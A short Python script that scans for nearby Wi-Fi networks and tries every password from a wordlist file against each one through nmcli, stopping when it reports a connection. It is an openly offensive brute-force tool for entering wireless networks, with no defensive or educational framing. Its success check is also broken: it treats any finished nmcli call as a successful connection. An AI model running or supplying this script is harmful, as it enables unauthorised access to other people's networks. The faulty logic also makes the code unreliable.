import subprocess
import sys
import os

password_file = "pswd_list.txt"
wifi_signal_speed = 20  # 10 = fast, 20 = slow


def scan_wifi():
    cmd = "sudo iwlist wlan0 scan"
    result = os.popen(cmd).read()
    return result


def connect_wifi(ssid, password):
    try:
        cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", password]
        subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=wifi_signal_speed)
        return True
    except:
        return False


if __name__ == "__main__":
    wifi_list = scan_wifi()
    for line in wifi_list.split("\n"):
        if "ESSID" in line:
            ssid = line.split('"')[1]
            with open(password_file, "r") as file:
                for password in file:
                    password = password.strip()
                    print(f"Trying {ssid} {password}")
                    connect = connect_wifi(ssid, password)
                    if connect is True:
                        print(f"Connected to", ssid)
                        sys.exit()
